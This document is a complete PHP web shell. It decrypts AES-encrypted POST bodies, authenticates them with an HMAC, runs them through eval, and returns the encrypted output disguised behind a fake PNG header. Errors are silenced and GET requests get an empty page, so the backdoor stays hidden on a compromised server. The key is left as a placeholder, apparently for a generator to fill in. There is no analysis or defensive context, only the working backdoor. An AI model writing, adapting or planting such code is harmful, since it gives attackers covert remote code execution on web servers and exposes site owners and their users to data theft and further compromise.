<?php
@session_start();
@error_reporting(0);
@ini_set('display_errors', '0');

function Decrypt($data) {
    if (!function_exists('openssl_decrypt')) return "";
    

    if (!is_string($data) || strlen($data) <= 116) return ""; 
    
    $prefixLen = 68; 
    $encrypted = substr($data, $prefixLen);
    if (!is_string($encrypted)) return "";
    $encLen = strlen($encrypted);
    
    $key = "__KEY__"; 
    $raw = unpack('C*', $key);
    $raw = $raw ? array_values($raw) : [];
    $rawLen = count($raw);
    if ($rawLen === 0) return "";
    
    $aesKey = "";
    for ($i = 0; $i < 16; $i++) {
        $aesKey .= chr($raw[$i % $rawLen] ^ 0x1F);
    }
    
    $iv = substr($encrypted, 0, 16);
    $tag = substr($encrypted, $encLen - 32, 32);
    
    $bodyLen = $encLen - 16 - 32;
    if ($bodyLen <= 0) return "";
    $body = substr($encrypted, 16, $bodyLen);
    
    if (!is_string($iv) || !is_string($tag) || !is_string($body)) return "";
    

    $macData = $iv . $body;
    $check = hash_hmac('sha256', $macData, $aesKey, true);
    if (!hash_equals($check, $tag)) return ""; 
    
    $decrypted = openssl_decrypt($body, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
    return is_string($decrypted) ? $decrypted : "";
}

function Encrypt($data) {
    if (!function_exists('openssl_encrypt')) return $data;
    if (!is_string($data)) return "";
    
    $key = "__KEY__"; 
    $raw = unpack('C*', $key);
    $raw = $raw ? array_values($raw) : [];
    $rawLen = count($raw);
    if ($rawLen === 0) return $data;
    
    $aesKey = "";
    $ivStr = "";
    for ($i = 0; $i < 16; $i++) {
        $aesKey .= chr($raw[$i % $rawLen] ^ 0x1F);
        $ivStr .= chr($raw[$i % $rawLen] ^ 0x2E);
    }
    
    $enc = openssl_encrypt($data, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $ivStr);
    $macData = $ivStr . $enc;
    $tag = hash_hmac('sha256', $macData, $aesKey, true);
    

    $prefix = base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk" . "+" . "A8AAQUBAScY42YAAAAASUVORK5CYII=");
    return $prefix . $ivStr . $enc . $tag;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $postData = file_get_contents("php://input");
    if (!empty($postData)) {
        $deMsg = Decrypt($postData);
        if (!empty($deMsg)) {
            ob_start();
            try {
                @eval($deMsg);
            } catch (\Throwable $e) {

            }
            $output = ob_get_contents();
            ob_end_clean();
            echo Encrypt($output);
        }
    }
} else {

    echo "";
}
?>
